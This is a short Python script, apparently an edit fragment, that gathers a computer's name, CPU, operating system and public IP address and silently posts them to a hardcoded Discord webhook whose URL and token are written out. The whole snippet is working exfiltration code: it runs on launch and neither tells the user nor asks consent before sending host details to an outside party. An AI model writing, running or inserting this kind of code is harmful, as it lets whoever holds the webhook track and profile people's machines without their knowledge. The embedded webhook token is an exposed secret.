# ...existing code...
import platform
import requests

def get_system_info():
    info = {
        "PC Name": platform.node(),
        "CPU": platform.processor(),
        "System": platform.system(),
        "Release": platform.release(),
        "GPU": "Nicht direkt auslesbar mit Standardbibliothek",
        "IP": requests.get('https://api.ipify.org').text
    }
    return info

def send_to_discord(info):
    webhook_url = "https://discord.com/api/webhooks/1405503845718691902/RSNUCB-5GKuUc72Y_1KnABjjsHrtCug8i4NO7wynNS8zTWmx96tvJoTXueotAsAr7OHH"
    data = {
        "content": "\n".join([f"{k}: {v}" for k, v in info.items()])
    }
    requests.post(webhook_url, json=data)

def main():
    info = get_system_info()
    send_to_discord(info)

if __name__ == "__main__":
    main()
# ...existing code...